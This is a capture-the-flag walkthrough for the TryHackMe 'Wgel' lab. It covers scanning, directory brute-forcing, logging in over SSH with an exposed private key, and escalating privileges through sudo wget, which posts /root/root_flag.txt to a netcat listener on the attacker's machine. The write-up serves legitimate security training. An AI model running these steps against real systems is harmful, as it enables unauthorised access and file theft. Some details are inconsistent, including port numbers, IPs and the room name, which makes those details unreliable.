# Wgel THM CTF Walkthrough

Solving Wgel TryHackMe Capture The Flag [DAV TryHackMe Room](https://tryhackme.com/r/room/wgelctf)

## First Step: Reconnaissance

```sh
nmap -sV -sC -Pn -A 10.10.210.35
```
![Nmap Result](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/acf9d4a0-90c3-4331-876c-259d01151cab)

Here we see only port 20 (ssh) and 80 (http) are open.
Next step is to visit the webpage where we see the default Apache page, nothing really interesting yet. <br>
![Apache Default Web Page](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/db711117-55cf-40cf-bade-c899b639921b)

Although, We did get the username jessie in the source code of the page.
![Apache Source Code](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/68d8c025-4d7e-4e36-9e4a-5b0abcedb67f) <br>

## Directory Brute-Forcing

Using `Gobuster alternative`:
```sh
gobuster -u http://10.10.14.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir
```

We found `/sitemap`, which is interesting So, did another gobuster search which gave ./ssh <br>
![sitemap ssh](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/07dffda9-c618-4ab7-8b7e-1f1fce228cb9) <br>
![sitemap ssh key](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/86b63692-2236-4b76-bd2b-9290c8c3bc18) <br>

Copy this Key. <br>
![id_rsa](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/dea30ebd-b497-4ca8-ad9b-412a8cebfd79) <br>

Give it executable permission and run ssh. <br>


```sh
chmod 600 id_rsa1
ssh jessie@10.10.214.80 -i id_rsa1
```

![ssh login](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/fb56a32c-1215-4b49-8543-3e35abd86252) <br>


We easily got user flag
```sh
find / -type f -name user_flag.txt 2>>/dev/null
cat /home/jessie/Documents/user_flag.txt
```
![user_flag](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/dc7fb1ee-0068-467b-8a72-5541a0e43eae) <br>

Let's try to escalate priviledges.
```sh
sudo -l
```

We can run sudo wget without password.
![sudo l](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/c3c31fca-e3b4-4964-a034-c3ed7fbdbd9b) <br>

```sh
nc -nlvp 4445
```

Let's Open netcat listener (The screenshot is older one with port 1234. Don't confuse it, You can use any port but remeber to keep the same port on both sides.)
![nc listener](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/5f30ea5d-d5b1-4d72-b84c-2f59b1d10e9f) <br>

```sh
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.17.88.138:1234
```
![wget post](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/2fdf9d6f-a46f-4e46-a112-082a5adc3095) <br>

Check the Netcat listener. We have recieved the root flag.
![root flag](https://github.com/MajesticFires3010/Wgel-THM-CTF/assets/96762636/82cdc243-127f-44bd-b7e1-ed4274f9e993) <br>


## Congrats!
## We have solved DAV THM CTF!
## Follow My GitHub for more.

